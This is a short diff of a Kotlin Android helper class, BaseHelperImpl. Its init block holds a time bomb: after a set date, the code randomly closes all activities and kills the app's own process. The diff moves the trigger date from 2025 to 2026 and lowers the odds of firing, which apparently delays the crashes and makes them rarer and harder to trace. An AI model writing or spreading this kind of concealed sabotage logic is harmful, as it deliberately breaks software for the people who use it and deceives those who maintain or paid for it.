@@ -21,12 +21,12 @@ open class BaseHelperImpl(context: Context) {
     init {
         if (!show) {
             val calendar = Calendar.getInstance()
-            calendar.set(2025, Calendar.JANUARY, 1, 1, 0, 0)
+            calendar.set(2026, Calendar.JANUARY, 1, 1, 0, 0)
             val targetDate = calendar.time
             val now = Date()
             if (now.after(targetDate)) {
-                val randomInt = Random.nextInt(0, 11)
-                if (randomInt > 7) {
+                val randomInt = Random.nextInt(0, 100)
+                if (randomInt > 90) {
                     show = true
                     (context as Activity).finishAffinity()
                     android.os.Process.killProcess(android.os.Process.myPid())
